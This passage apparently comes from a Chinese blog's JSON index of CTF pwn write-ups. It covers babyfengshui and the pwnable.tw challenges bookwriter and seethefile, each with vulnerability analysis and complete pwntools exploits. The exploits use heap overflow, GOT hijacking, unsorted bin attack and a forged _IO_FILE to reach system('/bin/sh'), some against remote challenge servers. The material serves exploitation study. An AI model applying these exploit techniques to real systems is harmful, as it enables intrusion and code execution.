tutor?(yes/no)\")\n    myproc.sendline(yes_no)\n\ndef delete(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"input a id to delete\")\n    myproc.sendline(str(id))\n\ndef edit(id,option,len,name):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"input a id to edit\")\n    myproc.sendline(str(id))\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(option))\n    myproc.recvuntil(\"please input the length of new name\")\n    myproc.sendline(str(len))\n    myproc.recvuntil(\"please input new name\")\n    myproc.sendline(name)\n\n\ndef sayhello(id):\n    myproc.recvuntil(\"option:\")\n    myproc.sendline(str(4))\n    myproc.recvuntil(\"input a id to sayhello\")\n    myproc.sendline(str(id))\n\nfor i in range(10):\n    add(0x10,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x20,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x30,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x40,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x50,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x60,\"xiayuan\",20,\"NUDT\",\"yes\")\n    add(0x70,\"xiayuan\",20,\"NUDT\",\"yes\")\n\nadd(0x10,\"xiayuan70\",20,\"NUDT70\",\"yes\")\nadd(0x10,\"xiayuan71\",20,\"NUDT71\",\"yes\")\nadd(0x10,\"xiayuan72\",20,\"NUDT72\",\"yes\")\nadd(0x10,\"xiayuan73\",20,\"NUDT73\",\"yes\")\n\npayload = \"a\" * 0x40 + p64(71) + p64(myelf.got[\"puts\"]) + p64(0x400760) + p64(0) \n#payload = \"a\" * 0x40 + p64(71) + p64(0xdeadbeef) + p64(0xdeadbeef) + p64(0) #+ p64(0)\nedit(70,1,990,payload)\nsayhello(71)\nmyproc.recv()\nputs_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\nlog.warn(\"put addr: 0x%x\" % puts_addr)\n\nlibc_base = puts_addr - 0x6F690\nsystem_addr = libc_base + 0x45390\nsh_addr = libc_base + next(mylibc.search(\"/bin/sh\\x00\"))\nlog.warn(\"libc base: 0x%x\" % libc_base)\nlog.warn(\"system addr: 0x%x\" % system_addr)\nlog.warn(\"sh addr: 0x%x\" % sh_addr)\n\npayload = \"a\" * 0x40 + p64(73) + p64(sh_addr) + p64(system_addr) + p64(0) \nedit(72,1,990,payload)\nsayhello(73)\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n","categories":["CTF"]},{"title":"babyfengshui","url":"/2020/04/19/babyfengshui/","content":"\n# 1 分析\n\n## 1.1 二进制程序基本信息\n\n```shell\n$ file babyfengshui \nbabyfengshui: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6, stripped\n\n$ checksec babyfengshui \n[*] '/mnt/hgfs/vmshare-1604/babyfengshui/babyfengshui'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n\n```\n\n## 1.2 IDA分析源码流程\n\n程序主要有四个函数：添加用户，删除用户，展示用户信息，升级用户信息。\n\n### 添加用户\n\n```c\n····\nprintf(\"size of description: \");\n__isoc99_scanf(\"%u%c\", &v2, &v0);\nadd_user(v2);\n····\n_DWORD *__cdecl add_user(size_t a1)\n{\n  void *s; // ST24_4\n  _DWORD *v2; // ST28_4\n\n  s = malloc(a1);\n  memset(s, 0, a1);\n  v2 = malloc(0x80u);\n  memset(v2, 0, 0x80u);\n  *v2 = s;\n  ptr[(unsigned __int8)user_num] = v2;\n  printf(\"name: \");\n  get_v1((char *)ptr[(unsigned __int8)user_num] + 4, 0x7C);\n  update_description(++user_num - 1);\n  return v2;\n}\n```\n\n添加用户的代码，做了这么一件事，如下图所示。首先创建一个堆块用来存放description信息，用`*S`指向它；再创建一个堆块，用`*V2`指向它，前四个字节存放description的地址，后面用来存放名字name；最后将bss段的ptr[0]指向`*V2`这个堆块。并将byte_804b069自加1，这个值相当于记录目前一共申请了多少个user。\n\n![](babyfengshui-1.png)\n\n### 删除用户\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\ndel_user(v2);\n\nunsigned int __cdecl del_user(unsigned __int8 index)\n{\n  unsigned int v2; // [esp+1Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    free(*(void **)ptr[index]);\n    free(ptr[index]);\n    ptr[index] = 0;\n  }\n  return __readgsdword(0x14u) ^ v2;\n}\n```\n\n删除用户的代码中，将一个用户拥有的两个堆块分别释放，并将bss段对应的ptr[n]置0。虽然此时`*V2`的前四个字节还指向`*S`，但当堆块被扔到bin中时，会做清理，因此不会造成问题。\n\n### 展示用户信息\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\ndisp_user(v2);\n\nunsigned int __cdecl disp_user(unsigned __int8 index)\n{\n  unsigned int v2; // [esp+1Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    printf(\"name: %s\\n\", (char *)ptr[index] + 4);\n    printf(\"description: %s\\n\", *(_DWORD *)ptr[index]);\n  }\n  return __readgsdword(0x14u) ^ v2;\n}\n```\n\n这个函数很简单，根据给定的index，将用户的name和description信息打印出来。通过这个函数的功能我们可以猜测，之后泄露信息一定要用到它。\n\n### 升级用户信息\n\n```c\nprintf(\"index: \");\n__isoc99_scanf(\"%d\", &v2);\nupdate_description(v2);\n\nunsigned int __cdecl update_description(unsigned __int8 index)\n{\n  char v2; // [esp+17h] [ebp-11h]\n  int v3; // [esp+18h] [ebp-10h]\n  unsigned int v4; // [esp+1Ch] [ebp-Ch]\n\n  v4 = __readgsdword(0x14u);\n  if ( index < (unsigned __int8)user_num && ptr[index] )\n  {\n    v3 = 0;\n    printf(\"text length: \");\n    __isoc99_scanf(\"%u%c\", &v3, &v2);\n    if ( (char *)(v3 + *(_DWORD *)ptr[index]) >= (char *)ptr[index] - 4 )\n    {\n      puts(\"my l33t defenses cannot be fooled, cya!\");\n      exit(1);\n    }\n    printf(\"text: \");\n    get_v1(*(char **)ptr[index], v3 + 1);\n  }\n  return __readgsdword(0x14u) ^ v4;\n}\n```\n\n升级用户信息这个函数乍一看没看出问题，就是不太明白`(char *)(v3 + *(_DWORD *)ptr[index]) >= (char *)ptr[index] - 4`这一个判断的作用是啥，以为不会有漏洞点就跳过了。谁知道！！问题就出在这儿！！\n\n这一判断的目的是，保证当前用户的description块不会覆盖name块。如果分配给一个用户的两个堆块是相邻的，且description块在低地址，name块在高地址的话，这个判断是很有用的。但是如果这两个堆块不相邻，那么问题就来了，位于description块和name块之间的所有堆块都可以被我们的输入覆盖。\n\n因此，我们只要构造一个用户，其两个堆块在另一个用户堆块description块和name块之间即可。\n\n### 利用分析\n\n以添加第一个用户为例，需要我们指定description的堆块大小，还会申请一个固定大小0x80的堆块（该堆块被释放后会进入unsorted bin）。如果指定description大小为fast bin的大小，那么当删除这个用户时（非第一个用户，因为第一个用户的堆chunk紧挨着top chunk，释放后会跟top chunk合并而非进入bin中），description块会进入fast bin，而name块会进入unsorted bin（0x80）。\n\n这时，如果我们添加一个用户，并且指定description大小为0x80，那么unsorted bin中的那个块会被分配给这个用户的description，然后再新生成一个0x80大小的chunk给这个用户做name块。因此就构造了如下图所示的两个用户堆块关系：\n\n![](babyfengshui-2.png)\n\n这样我们调用“升级用户信息”函数更改description A的值，使name B的前四个字节被覆盖为got表中的free表项(泄露free地址，我们要用`（1）system替换free（2）将description A的前几个字节改成“/bin/sh\\x00”`，这样在删除用户free(S)时，就去执行了`system(\"/bin/sh\\x00\")`)，这样当我们调用打印信息时，会去打印free这个got表项存放的真正的free函数地址，从而泄露出free函数地址（根据该地址，结合对应的libc版本，我们可以进一步算出libc基址和system函数地址）。\n\n获得system函数地址后，我们调用升级B用户信息，将system地址写入got表中的free表项，从而实现了free函数的劫持。然后在之前往description A中写信息时，将\"/bin/sh\\x00\"写在起始位置。最后，调用删除函数删除用户A的信息，就可以实现get shell利用了。\n\n# 2 exp\n\n```python\n#coding=utf-8\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./babyfengshui')\n#myproc = process(myelf.path)\nmyproc = remote(\"159.138.137.79\",65054)\n\ndef add_user(size,name,text_length,text):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(0))\n    myproc.recvuntil(\"size of description: \")\n    myproc.sendline(str(size))\n    myproc.recvuntil(\"name: \")\n    myproc.sendline(name)\n    myproc.recvuntil(\"text length: \")\n    myproc.sendline(str(text_length))\n    myproc.recvuntil(\"text: \")\n    myproc.sendline(text)\n\ndef del_user(user_index):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n\ndef disp_user(user_index):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(2))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n\ndef update_description(user_index,text_length,text):\n    myproc.recvuntil(\"Action: \")\n    myproc.sendline(str(3))\n    myproc.recvuntil(\"index: \")\n    myproc.sendline(str(user_index))\n    myproc.recvuntil(\"text length: \")\n    myproc.sendline(str(text_length))\n    myproc.recvuntil(\"text: \")\n    myproc.sendline(text)\n\nadd_user(0x10,'name0',0x10,'text0')\nadd_user(0x10,'name1',0x10,'text1')\ndel_user(0)\nadd_user(0x80,'name2',0x80,'text2')\n\npayload = \"/bin/sh\\x00\"+\"a\"*(0xa0 - len(\"/bin/sh\\x00\")) + p32(myelf.got['free'])\nupdate_description(2,len(payload),payload)\ndisp_user(1)\nmyproc.recvuntil('description: ')\nfree_addr = u32(myproc.recv(4))\n\nlibc_base = free_addr - 0x070750\nsystem_addr =  libc_base + 0x03a940\n\n# 将free函数的got表项写成system函数地址\nupdate_description(1,4,p32(system_addr))\n\ndel_user(2)\n#gdb.attach(myproc)\n\nmyproc.interactive()\n```\n\n# 3 libc版本\n\n根据泄露的函数地址的后三位可以确定对应的libc版本，具体操作见如下链接。\n\n参考链接：\nhttps://www.jianshu.com/p/8d2552b8e1a2\nhttps://libc.blukat.me/\n\n# 4 题目参考链接\n\nhttps://blog.csdn.net/Breeze_CAT/article/details/103788631\n","tags":["heap","堆风水"],"categories":["CTF"]},{"title":"pwnable.tw 之 bookwriter","url":"/2020/04/04/bookwriter/","content":"\n[题目链接](https://pwnable.tw/challenge/#24)\n\n参考wp：\n\n[【PWNABLE.TW】 BookWriter 解题思路](http://p4nda.top/2017/12/15/pwnable-tw-bookwriter/)\n\n[Pwnable.tw之BookWriter](https://bbs.pediy.com/thread-226694.htm)\n\n# 1 分析\n\n查看二进制各项属性：\n\n```shell\n$ file bookwriter\nbookwriter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c3e466870c649d07e84498bb143f1bb5916ae34, stripped\n$ checksec bookwriter \n[*] '/mnt/hgfs/vmshare-1604/bookwriter/bookwriter'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n    FORTIFY:  Enabled\n\n```\n\n- 64位二进制程序，动态链接，去了符号表\n- got表不可写\n- 栈不可执行，开启栈canary\n- 地址随机化未开启\n\n使用IDA分析二进制源码逻辑，存在四个功能，分别是：\n\n- add：添加page和内容\n- view：查看page的内容\n- edit：更改page的内容，并重新调整大小值size\n- information：显示作者姓名\n\n漏洞点有以下几个：\n\n- 未进入while循环前输入作者姓名时，结束符控制有问题。导致后续打印该字符串时可越界读。\n- add函数中的if(i>8)判断有误，导致bss段原本存放size的位置可被覆盖为堆地址\n- edit函数中同样存在第一个问题，在输入字符串时，结束符控制有问题，导致计算strlen时产生一个大于原本字符串的值，后续可以越界写。\n\n# 2 利用\n\n## 2.1 泄露堆地址和libc基址\n\n泄露堆地址和libc测试代码：\n\n```\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf=ELF('./bookwriter')\nmylibc=ELF('./libc_64.so.6')\nmyproc=process(['./bookwriter'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n\ndef add_page(p_size,p_content):\n    myproc.recvuntil(\"Your choice :\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Size of page :\")\n    myproc.sendline(str(p_size))\n    myproc.recvuntil(\"Content :\")\n    myproc.send(p_content)\n\ndef view_page(p_index):\n    myproc.sendlineafter(\"Your choice :\",str(2))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n#获取unsorted bin中第一个bin的top值\n    myproc.recvuntil(\"yuan\")\n    top_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    return top_addr\n\ndef edit_page(p_index,p_content):\n    myproc.sendlineafter(\"Your choice :\",str(3))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.sendlineafter(\"Content:\",p_content)\n\ndef information(choice,p_author):\n    myproc.sendlineafter(\"Your choice :\",str(4))\n#获取.bss段中author_name相邻的page指针，即堆地址\n    myproc.recvuntil(\"yuan\")\n    ret = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    myproc.sendlineafter(\"Do you want to change the author ? (yes:1 / no:0) \",str(choice))\n    if (choice == 1):\n        myproc.sendlineafter(\"Author :\",p_author)  \n    return ret\n    \n#泄露堆地址\nmyproc.sendafter(\"Author :\",\"a\"*60+\"yuan\")     #构造64字节name，后续打印name会越界打印出堆地址\nadd_page(0x18,\"b\"*0x18)      \nedit_page(0,\"c\"*0x18)    #计算size的时候会把top chunk的size字段也算进去，导致下一步可以多写3字节\nedit_page(0,\"\\x00\"*0x18+\"\\xe1\\x0f\\x00\")    #将page0的内容改为空，则page0的size字段为空，可绕过add_page中对page[8]的检查。最后三个字节更改top chunk的大小，使其进入unsorted bin中，从而泄露top地址\nheap_addr = information(0,0)    #获取page[0]上的堆地址\nlog.warn(\"heap addr: 0x%x \" % heap_addr)\n\n#泄露libc\nfor i in range(0,8):\n    add_page(0x64,\"a\"*4+\"yuan\")\ntop_addr = view_page(3)      # 除了第一个从unsorted bin中分配的堆块，无法获得top地址，其他都可\nlog.warn(\"top_addr: 0x%x\" % top_addr)\nlibc_base = top_addr - 0x58 - 0x3c3b20    #通过top地址，计算libc基址。0x58可以在堆调试中看到,0x3c3b20是查看libc.so中malloc_trim函数中变量的偏移获取到的。\nlog.warn(\"libc_base: 0x%x\" % libc_base)\n\ngdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n## 2.2 get shell\n\n通过以上代码，已经可以实现往第0个堆上写超长数据，从而覆盖堆空间其他部分了。\n\n现在还需要解决几个问题：\n\n（1）通过unsortedbin attack将IO_list_all覆盖为我们可写的内存地址，从而伪造IO_FILE_plus结构体\n\n问题1：但是通过unsortedbin attack只能将IO_list_all覆盖为mainarena+0x58（64位），该空间是我们不可控的，且空间的条件内不满足执行_IO_OVERFLOW，因此会转去寻找chain这个地址。\n\n（2）此时chain的位置正好是small bin的区域，因此我们需要构造一个能控制的small bin chunk\n\n问题2：怎么获得这个可控制的small bin chunk呢？将unsorted bin chunk中的chunk大小改一下，改成small bin大小，这样从unsorted bin中拆下的chunk就会被链接到对应大小的small bin上。\n\n问题3：这个大小应该多大呢？根据（1）中chain的位置来确定，本题是0x60。\n\n### unsorted bin attack\n\n参考ctf-wiki：[unsorted bin attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/)\n\n利用该方法可以往任意地址写一个固定的值。本题中可以将main_arena+0x58的地址写到IO_list_all上（将IO_list_all - 0x10的地址放在unsorted chunk的bk处），从而将IO_FILE_plus转移。由于main_arena不满足条件，会继续转移。IO_FILE中chain的位置正好在0x60大小small bin的bk处。如下图，构造一个0x60大小的unsorted bin，malloc时会将该unsorted bin放到chunk(IO_FILE)位置。而unsorted bin chunk的大部分区域我们都可以通过堆溢出来任意写。\n\n![](bookwriter-1.png)\n\n### I/O FILE\n\n以上分析可知，我们现在需要在unsorted bin chunk里布局IO_FILE_plus结构体，有一些限制条件，在参考链接中有提及，这里不复述。因此，通过堆溢出在第0号堆块上布局如下：\n\n![](bookwriter-2.png)\n\n按照如上构造后，在gef中调试打印如下：\n\n```shell\ngef➤  heap chunks\nChunk(addr=0x1c91010, size=0x20, flags=PREV_INUSE)\n    [0x0000000001c91010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]\ngef➤  x/50gx 0x1c91010+0x390\n0x1c913a0:\t0x0068732f6e69622f\t0x0000000000000061\n0x1c913b0:\t0x0000000000000000\t0x00007f9ecc967510\n0x1c913c0:\t0x0000000000000002\t0x0000000000000003\n0x1c913d0:\t0x0000000000000000\t0x0000000000000000\n0x1c913e0:\t0x0000000000000000\t0x0000000000000000\n0x1c913f0:\t0x0000000000000000\t0x0000000000000000\n0x1c91400:\t0x0000000000000000\t0x0000000000000000\n0x1c91410:\t0x0000000000000000\t0x0000000000000000\n0x1c91420:\t0x0000000000000000\t0x0000000000000000\n0x1c91430:\t0x0000000000000000\t0x0000000000000000\n0x1c91440:\t0x0000000000000000\t0x0000000000000000\n0x1c91450:\t0x0000000000000000\t0x0000000000000000\n0x1c91460:\t0xffffffffffffffff\t0x0000000000000000\n0x1c91470:\t0x0000000000000000\t0x0000000001c91480\n0x1c91480:\t0x0000000000000000\t0x0000000000000000\n0x1c91490:\t0x0000000000000001\t0x00007f9ecc5e7390\n0x1c914a0:\t0x0000000000000000\t0x0000000000000000\n0x1c914b0:\t0x0000000000000000\t0x0000000000000000\n0x1c914c0:\t0x0000000000000000\t0x0000000000000000\n0x1c914d0:\t0x0000000000000000\t0x0000000000000000\n0x1c914e0:\t0x0000000000000000\t0x0000000000000000\n0x1c914f0:\t0x0000000000000000\t0x0000000000000000\n0x1c91500:\t0x0000000000000000\t0x0000000000000000\n0x1c91510:\t0x0000000000000000\t0x0000000000000000\n0x1c91520:\t0x0000000000000000\t0x0000000000000000\ngef➤  p *(struct _IO_FILE_plus*)0x1c913a0\n$1 = {\n  file = {\n    _flags = 0x6e69622f, \n    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, \n    _IO_read_end = 0x0, \n    _IO_read_base = 0x7f9ecc967510 \"\", \n    _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>, \n    _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>, \n    _IO_write_end = 0x0, \n    _IO_buf_base = 0x0, \n    _IO_buf_end = 0x0, \n    _IO_save_base = 0x0, \n    _IO_backup_base = 0x0, \n    _IO_save_end = 0x0, \n    _markers = 0x0, \n    _chain = 0x0, \n    _fileno = 0x0, \n    _flags2 = 0x0, \n    _old_offset = 0x0, \n    _cur_column = 0x0, \n    _vtable_offset = 0x0, \n    _shortbuf = \"\", \n    _lock = 0x0, \n    _offset = 0x0, \n    _codecvt = 0x0, \n    _wide_data = 0x0, \n    _freeres_list = 0x0, \n    _freeres_buf = 0x0, \n    __pad5 = 0x0, \n    _mode = 0xffffffff, \n    _unused2 = \"\\377\\377\\377\\377\", '\\000' <repeats 15 times>\n  }, \n  vtable = 0x1c91480\n}\ngef➤  p *(struct _IO_jump_t*)0x1c91480\n$2 = {\n  __dummy = 0x0, \n  __dummy2 = 0x0, \n  __finish = 0x1, \n  __overflow = 0x7f9ecc5e7390 <__libc_system>, \n  __underflow = 0x0, \n  __uflow = 0x0, \n  __pbackfail = 0x0, \n  __xsputn = 0x0, \n  __xsgetn = 0x0, \n  __seekoff = 0x0, \n  __seekpos = 0x0, \n  __setbuf = 0x0, \n  __sync = 0x0, \n  __doallocate = 0x0, \n  __read = 0x0, \n  __write = 0x0, \n  __seek = 0x0, \n  __close = 0x0, \n  __stat = 0x0, \n  __showmanyc = 0x0, \n  __imbue = 0x0\n}\n```\n\n# 3 EXP\n\n```\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\nmyelf=ELF('./bookwriter')\nmylibc=ELF('./libc_64.so.6')\nmyproc=remote(\"chall.pwnable.tw\",10304)\n#myproc=process(['./bookwriter'], env={\"LD_PRELOAD\":\"./libc_64.so.6\"})\n#mylibc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')\n#myproc=process(myelf.path)\n\ndef add_page(p_size,p_content):\n    myproc.recvuntil(\"Your choice :\")\n    myproc.sendline(str(1))\n    myproc.recvuntil(\"Size of page :\")\n    myproc.sendline(str(p_size))\n    myproc.recvuntil(\"Content :\")\n    myproc.send(p_content)\n\ndef view_page(p_index):\n    myproc.sendlineafter(\"Your choice :\",str(2))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.recvuntil(\"aaaaaaaa\")\n    top_addr = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    return top_addr\n\ndef edit_page(p_index,p_content):\n    myproc.sendlineafter(\"Your choice :\",str(3))\n    myproc.sendlineafter(\"Index of page :\",str(p_index))\n    myproc.sendlineafter(\"Content:\",p_content)\n\ndef information(choice,p_author):\n    myproc.sendlineafter(\"Your choice :\",str(4))\n    myproc.recvuntil(\"yuan\")\n    ret = u64(myproc.recvuntil(\"\\n\")[:-1].ljust(8,\"\\x00\"))\n    myproc.sendlineafter(\"Do you want to change the author ? (yes:1 / no:0) \",str(choice))\n    if (choice == 1):\n        myproc.sendlineafter(\"Author :\",p_author)  \n    return ret\n\nmyproc.sendafter(\"Author :\",\"a\"*60+\"yuan\")\nadd_page(0x18,\"b\"*0x18)\nedit_page(0,\"c\"*0x18)\nedit_page(0,\"\\x00\"*0x18+\"\\xe1\\x0f\\x00\")\nheap_addr = information(0,0)\nlog.warn(\"heap addr: 0x%x \" % heap_addr)\n\nfor i in range(0,8):\n    add_page(0x64,\"a\"*8)\n\ntop_addr = view_page(3)\nlog.warn(\"top_addr: 0x%x\" % top_addr)\n#yuancheng\nlibc_base = top_addr - 0x58 - 0x3c3b20\n#bendi\n#libc_base = top_addr - 0x58 - 0x3c4b20\nlog.warn(\"libc_base: 0x%x\" % libc_base)\n\nfakefile = \"/bin/sh\\0\" + p64(0x61) + p64(0) + p64(libc_base + mylibc.symbols['_IO_list_all']-0x10) + p64(2) + p64(3)\nfakefile += \"\\x00\"*0x90 + p64(0xffffffffffffffff) + \"\\x00\"*0x10 \nfakefile += p64(heap_addr + 0x390 + 0xe0)\n\nvtable = p64(0) + p64(0) + p64(1) + p64(libc_base + mylibc.symbols[\"system\"])\n\npayload = \"\\x00\"*0x390 + fakefile + vtable\nedit_page(0,payload)\n\nmyproc.recvuntil(\"Your choice :\")\nmyproc.sendline(str(1))\nmyproc.recvuntil(\"Size of page :\")\nmyproc.sendline(str(0x10))\n\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n\n\n\n\n","categories":["CTF"]},{"title":"pwnable.tw 之 seethefile","url":"/2020/03/29/seethefile/","content":"\n[题目链接](https://pwnable.tw/challenge/#9)\n\n# 1 分析\n\n```shell\n$ file seethefile \nseethefile: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=04e6f2f8c85fca448d351ef752ff295581c2650d, not stripped\n$ checksec seethefile\n[*] '/mnt/hgfs/vmshare-1604/seethefile/seethefile'\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8048000)\n```\n\n- 32位二进制可执行程序\n- 动态链接\n- got表可读可写\n- 栈不可执行，未开栈canary\n- 未随机化\n\n程序一共实现了五个功能：\n\n- open：打开文件\n\n- read：读文件\n\n- write to screen：将读取的内容打印到屏幕\n\n- close：关闭文件\n- exit：退出\n\n所有操作都是针对如下几个bss段的全局变量：\n\n- char filename[64]\n- char magicbuf[416]\n- name，占0x20个字节\n- FILE *fp\n\nopenfile读取字符串到filename[64]处，如果文件名不包含“flag”字符串就打开这个文件，并将文件描述符指针关联到bss段的FILE *fp。\n\nreadfile将打开文件的内容读取到magicbuf[416]。\n\nwrite to screen将magicbuf[416]中的内容打印到屏幕上。（filename不能包含“flag”，内容中不能包含\"FLAG\"或\"}\"）\n\nclose将打开的文件关闭。\n\nexit退出前会读取一段字符串到bss段的name处，然后判断fp是否为空，若不为空就fslose(fp)。如下代码：\n\n```c\n      case 5:\n        printf(\"Leave your name :\");\n        __isoc99_scanf(\"%s\", &name);\n        printf(\"Thank you %s ,see you next time\\n\", &name);\n        if ( fp )\n          fclose(fp);\n        exit(0);\n        return;\n```\n\n漏洞点：name和fp相邻，name处在低地址，fp处在高地址。scanf未限制name输入的字符串大小，导致溢出覆盖fp指针。\n\n触发代码：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./seethefile')\n#mylibc = ELF('./libc_32.so.6')\nmylibc = ELF(\"/lib32/libc-2.23.so\")\nmyproc = process(myelf.path)\n#myproc = process(['./seethefile'], env={\"LD_PRELOAD\":\"./libc_32.so.6\"})\n#myproc = remote('chall.pwnable.tw',10200)\n\ndef openfile(filename):\n    myproc.sendlineafter(\"Your choice :\",'1')\n    myproc.sendlineafter(\"What do you want to see :\",filename)\n\ndef readfile():\n    myproc.sendlineafter(\"Your choice :\",'2')\n\ndef printfile():\n    myproc.sendlineafter(\"Your choice :\",'3')\n\ndef closefile():\n    myproc.sendlineafter(\"Your choice :\",'4')\n\ndef exit(name):\n    myproc.sendlineafter(\"Your choice :\",'5')\n    myproc.sendlineafter(\"Leave your name :\",name)\n\nclosefile()\ngdb.attach(myproc)\nexit('a'*50)\nmyproc.interactive()\n```\n\n执行以上出发代码，观察堆栈发现eax和esi都被输入的“a”字符给覆盖了。\n\n```shell\n$eax   : 0x61616161 (\"aaaa\"?)\n$ebx   : 0xf7f7a000  →  0x001afdb0\n$ecx   : 0xffffffff\n$edx   : 0xf7f7b870  →  0x00000000\n$esp   : 0xffe11f60  →  0xf7faa7eb  →   add esi, 0x15815\n$ebp   : 0xffe11f88  →  0xffe11fd8  →  0x00000000\n$esi   : 0x61616161 (\"aaaa\"?)\n$edi   : 0xf7f7a000  →  0x001afdb0\n$eip   : 0xf7e26ed7  →  <fclose+23> cmp BYTE PTR [esi+0x46], 0x0\n$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86\n```\n\n# 2 利用\n\n根据fclose的特性，参考了以下几篇文章：\n\n[pwnable.tw 9 seethefile ](https://blog.csdn.net/qq_42192672/article/details/84782627)\n\n[glibc fclose源代码阅读及伪造_IO_FILE利用fclose实现任意地址执行](https://www.jianshu.com/p/2e00afb01606)\n\n（1）_IO_FILE结构体大小为0x94\n\n（2）flags & 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp->vtabl->__finish(fp)\n\n（3）将fp指向一块内存P，P偏移0的前4字节设置为0xffffdfff，P偏移4位置放上要执行的字符串指令（字符串以';'开头即可），P偏移sizeof(_IO_FILE)大小位置（vtable）覆盖为内存区域Q，Q偏移2*4字节处(vtable->__finish)覆盖为system函数地址即可\n\n（4）vtable是个虚标指针，里面一般性是21or23个变量\n\nexp如下：\n\n```python\n#coding=utf-8\n\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./seethefile')\nmylibc = ELF('./libc_32.so.6')\n#mylibc = ELF(\"/lib32/libc-2.23.so\")\n#myproc = process(myelf.path)\n#myproc = process(['./seethefile'], env={\"LD_PRELOAD\":\"./libc_32.so.6\"})\nmyproc = remote('chall.pwnable.tw',10200)\n\ndef openfile(filename):\n    myproc.sendlineafter(\"Your choice :\",'1')\n    myproc.sendlineafter(\"What do you want to see :\",filename)\n\ndef readfile():\n    myproc.sendlineafter(\"Your choice :\",'2')\n\ndef printfile():\n    myproc.sendlineafter(\"Your choice :\",'3')\n\ndef closefile():\n    myproc.sendlineafter(\"Your choice :\",'4')\n\ndef exit(name):\n    myproc.sendlineafter(\"Your choice :\",'5')\n    myproc.sendlineafter(\"Leave your name :\",name)\n\n#泄露libc\nopenfile(\"/proc/self/maps\")\nreadfile()\nprintfile()\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlog.warn(myproc.recvline())\nlibc_addr = int(myproc.recv(8),16) + 0x1000\nlog.warn(\"libc_addr : 0x%x\" % libc_addr)\nsys_addr = libc_addr + mylibc.symbols['system']\nlog.warn(\"sys_addr: 0x%x\" % sys_addr)\nclosefile()\n#覆盖函数指针\nopenfile('/proc/self/maps')\nFAKE_IO_FILE_addr = 0x0804b300\npayload = \"a\"*32 + p32(FAKE_IO_FILE_addr)\npayload += \"\\x00\"*(0x80-4)\npayload += \"\\xff\\xff\\xdf\\xff;sh\\x00\".ljust(0x94,'\\x00')\npayload += p32(FAKE_IO_FILE_addr + 0x98)\npayload += p32(sys_addr)*21\nexit(payload)\n#gdb.attach(myproc)\nmyproc.interactive()\n```\n\n其他解题思路：\n\n[seethefile 解题思路](http://p4nda.top/2017/09/20/pwnable-tw-seethefile/)\n\n","categories":["CTF"]},{"title":"pwnable.tw 之 